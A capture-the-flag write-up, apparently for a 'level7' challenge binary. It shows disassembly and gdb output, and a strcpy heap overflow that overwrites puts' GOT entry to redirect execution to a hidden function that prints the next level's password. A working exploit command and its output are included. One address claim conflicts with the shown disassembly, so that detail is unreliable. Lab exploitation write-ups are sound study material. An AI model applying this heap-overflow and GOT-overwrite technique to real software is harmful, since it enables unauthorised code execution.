# HEAP BUFFER OVERFLOW WITH STRCPY VULNERABILITY

```
~$ ./level7
Segmentation fault (core dumped)
~$ ./level7 a
Segmentation fault (core dumped)
~$ ./level7 a a
~~
```
The binary segfaults if its missing argv[1] and argv[2], but it doesn't segfault if it has them, guessing the vulnerability is in the way it handles them

```
(gdb) info files
Symbols from "/home/user/level7/level7".
Local exec file:
	`/home/user/level7/level7', file type elf32-i386.
	Entry point: 0x8048440
...
	0x080486bc - 0x080486d6 is .fini
	0x080486d8 - 0x08048706 is .rodata
	0x08048708 - 0x08048744 is .eh_frame_hdr
...
```

```
(gdb) x/20s 0x080486d8
0x80486d8 <_fp_hw>:	 "\003"
0x80486da <_fp_hw+2>:	 ""
0x80486db <_fp_hw+3>:	 ""
0x80486dc <_IO_stdin_used>:	 "\001"
0x80486de <_IO_stdin_used+2>:	 "\002"
0x80486e0:	 "%s - %d\n"
0x80486e9:	 "r"
0x80486eb:	 "/home/user/level8/.pass"
0x8048703:	 "~~"
0x8048706:	 <Address 0x8048706 out of bounds>
0x8048706:	 <Address 0x8048706 out of bounds>
0x8048706:	 <Address 0x8048706 out of bounds>
0x8048706:	 <Address 0x8048706 out of bounds>
0x8048706:	 <Address 0x8048706 out of bounds>
0x8048706:	 <Address 0x8048706 out of bounds>
0x8048706:	 <Address 0x8048706 out of bounds>
0x8048706:	 <Address 0x8048706 out of bounds>
0x8048706:	 <Address 0x8048706 out of bounds>
0x8048706:	 <Address 0x8048706 out of bounds>
0x8048706:	 <Address 0x8048706 out of bounds>
```

```asm
804852a:	c7 04 24 08 00 00 00 	mov    DWORD PTR [esp],0x8
 8048531:	e8 ba fe ff ff       	call   80483f0 <malloc@plt>
 8048536:	89 44 24 1c          	mov    DWORD PTR [esp+0x1c],eax
 804853a:	8b 44 24 1c          	mov    eax,DWORD PTR [esp+0x1c]
 804853e:	c7 00 01 00 00 00    	mov    DWORD PTR [eax],0x1
 8048544:	c7 04 24 08 00 00 00 	mov    DWORD PTR [esp],0x8
 804854b:	e8 a0 fe ff ff       	call   80483f0 <malloc@plt>
 8048550:	89 c2                	mov    edx,eax
 8048552:	8b 44 24 1c          	mov    eax,DWORD PTR [esp+0x1c]
 8048556:	89 50 04             	mov    DWORD PTR [eax+0x4],edx
 8048559:	c7 04 24 08 00 00 00 	mov    DWORD PTR [esp],0x8
 8048560:	e8 8b fe ff ff       	call   80483f0 <malloc@plt>
 8048565:	89 44 24 18          	mov    DWORD PTR [esp+0x18],eax
 8048569:	8b 44 24 18          	mov    eax,DWORD PTR [esp+0x18]
 804856d:	c7 00 02 00 00 00    	mov    DWORD PTR [eax],0x2
 8048573:	c7 04 24 08 00 00 00 	mov    DWORD PTR [esp],0x8
 804857a:	e8 71 fe ff ff       	call   80483f0 <malloc@plt>
 804857f:	89 c2                	mov    edx,eax
 8048581:	8b 44 24 18          	mov    eax,DWORD PTR [esp+0x18]
 8048585:	89 50 04             	mov    DWORD PTR [eax+0x4],edx
 8048588:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
```
Here is a part quite long to understand in asm, refer to the c source code to understand it better :
```c
    int *ptr1 = malloc(8);        // stored at esp+0x1c (to esp+0x1f included)
    ptr1[0]   = 1;                // ptr1 first  4-bytes are equal to 1
    ptr1[1]   = malloc(8);        // ptr1 second 4-bytes are equal to the address
                                  // ... of a new 8-bytes malloc

    int *ptr2 = (int *)malloc(8); // stored at esp+0x18 (to esp+0x21 included)
    ptr2[0]   = 2;                // ptr2 first  4-bytes are equal to 2
    ptr2[1]   = malloc(8);        // ptr3 second 4-bytes are equal to the address
                                  // ... of a new 8-bytes malloc
```
The first and the third allocations stored two DWORD:
- the first DWORD is an integer (not useful for the exploit)
- the second DWORD is a pointer to another malloc (the second and the fourth allocations, respectively)

```asm
804858b:	83 c0 04             	add    eax,0x4
 804858e:	8b 00                	mov    eax,DWORD PTR [eax]
 8048590:	89 c2                	mov    edx,eax
 8048592:	8b 44 24 1c          	mov    eax,DWORD PTR [esp+0x1c]
 8048596:	8b 40 04             	mov    eax,DWORD PTR [eax+0x4]
 8048599:	89 54 24 04          	mov    DWORD PTR [esp+0x4],edx
 804859d:	89 04 24             	mov    DWORD PTR [esp],eax
 80485a0:	e8 3b fe ff ff       	call   80483e0 <strcpy@plt>
 80485a5:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
 80485a8:	83 c0 08             	add    eax,0x8
 80485ab:	8b 00                	mov    eax,DWORD PTR [eax]
 80485ad:	89 c2                	mov    edx,eax
 80485af:	8b 44 24 18          	mov    eax,DWORD PTR [esp+0x18]
 80485b3:	8b 40 04             	mov    eax,DWORD PTR [eax+0x4]
 80485b6:	89 54 24 04          	mov    DWORD PTR [esp+0x4],edx
 80485ba:	89 04 24             	mov    DWORD PTR [esp],eax
 80485bd:	e8 1e fe ff ff       	call   80483e0 <strcpy@plt>
```
2 strcpy are done with a cli input source: 
- 1st = copying argv[1] at the address stored at the 2nd element of the first malloc (so at the second allocation). 
So we know that we can write on the next allocations (third and fourth) by the argv[1]
- 2nd = copying the content of argv[2] at the address stored at the 2nd element of the second malloc (initially the fourth allocation)

----
Since we know that malloc use a continous memory space:
- with argv[1] we can overflow the second malloc and overwrite the address we write with argv[2] at.
- with argv[2] we define what we write at the address we overwrite with argv[1]

```
(gdb) info files
Symbols from "/home/user/level7/level7".
Local exec file:
	`/home/user/level7/level7', file type elf32-i386.
	Entry point: 0x8048440
...
	0x080486bc - 0x080486d6 is .fini
	0x080486d8 - 0x08048706 is .rodata
	0x08048708 - 0x08048744 is .eh_frame_hdr
...
```
```
(gdb) x/20s 0x080486d8
0x80486d8 <_fp_hw>:	 "\003"
0x80486da <_fp_hw+2>:	 ""
0x80486db <_fp_hw+3>:	 ""
0x80486dc <_IO_stdin_used>:	 "\001"
0x80486de <_IO_stdin_used+2>:	 "\002"
0x80486e0:	 "%s - %d\n"
0x80486e9:	 "r"
0x80486eb:	 "/home/user/level8/.pass"
0x8048703:	 "~~"
0x8048706:	 <Address 0x8048706 out of bounds>
0x8048706:	 <Address 0x8048706 out of bounds>
0x8048706:	 <Address 0x8048706 out of bounds>
0x8048706:	 <Address 0x8048706 out of bounds>
0x8048706:	 <Address 0x8048706 out of bounds>
0x8048706:	 <Address 0x8048706 out of bounds>
0x8048706:	 <Address 0x8048706 out of bounds>
0x8048706:	 <Address 0x8048706 out of bounds>
0x8048706:	 <Address 0x8048706 out of bounds>
0x8048706:	 <Address 0x8048706 out of bounds>
0x8048706:	 <Address 0x8048706 out of bounds>
```
```asm
 80485c2:	ba e9 86 04 08       	mov    edx,0x80486e9
 80485c7:	b8 eb 86 04 08       	mov    eax,0x80486eb
 80485cc:	89 54 24 04          	mov    DWORD PTR [esp+0x4],edx
 80485d0:	89 04 24             	mov    DWORD PTR [esp],eax
 80485d3:	e8 58 fe ff ff       	call   8048430 <fopen@plt>
 80485d8:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
 80485dc:	c7 44 24 04 44 00 00 	mov    DWORD PTR [esp+0x4],0x44
 80485e3:	00 
 80485e4:	c7 04 24 60 99 04 08 	mov    DWORD PTR [esp],0x8049960
 80485eb:	e8 d0 fd ff ff       	call   80483c0 <fgets@plt>
 80485f0:	c7 04 24 03 87 04 08 	mov    DWORD PTR [esp],0x8048703
 80485f7:	e8 04 fe ff ff       	call   8048400 <puts@plt>
```
Specify which address will replace: at the end of the main function, the content of `/home/user/level8/.pass` is copied to a buffer located at 0x8048703, but is never read, only the puts function is called on a random "~~" string.

```asm
080484f4 <m>:
 80484f4:	55                   	push   ebp
 80484f5:	89 e5                	mov    ebp,esp
 80484f7:	83 ec 18             	sub    esp,0x18
 80484fa:	c7 04 24 00 00 00 00 	mov    DWORD PTR [esp],0x0
 8048501:	e8 ca fe ff ff       	call   80483d0 <time@plt>
 8048506:	ba e0 86 04 08       	mov    edx,0x80486e0
 804850b:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
 804850f:	c7 44 24 04 60 99 04 	mov    DWORD PTR [esp+0x4],0x8049960
 8048516:	08 
 8048517:	89 14 24             	mov    DWORD PTR [esp],edx
 804851a:	e8 91 fe ff ff       	call   80483b0 <printf@plt>
 804851f:	c9                   	leave  
 8048520:	c3                   	ret    
```
A m function exists and print the buffer located at 0x8048703, its never called but now we can we redirect the puts calling (in the PLT table) to this function it. 

```
~$ objdump -M intel -R level7 
level7:     file format elf32-i386
...
08049928 R_386_JUMP_SLOT   puts
...
```

```
~$ ltrace ./level7 a a
...
malloc(8)         = 0x0804a008
malloc(8)         = 0x0804a018
malloc(8)         = 0x0804a028
malloc(8)         = 0x0804a038
...
```
Now a bit of calculation:
- we need to overwrite the address stored at the second element of the third malloc = 0x0804a028 + 4 = 0x0804a02c
- we overwrite it from the first malloc second element (the second malloc address) = 0x0804a018
- we should put the address of the puts@plt (0x08049928) after a number of random bytes to overflow the buffer = 0x0804a02c - 0x0804a018 = 0x14 (20 in decimal)

```
~$ ./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1780663420
```
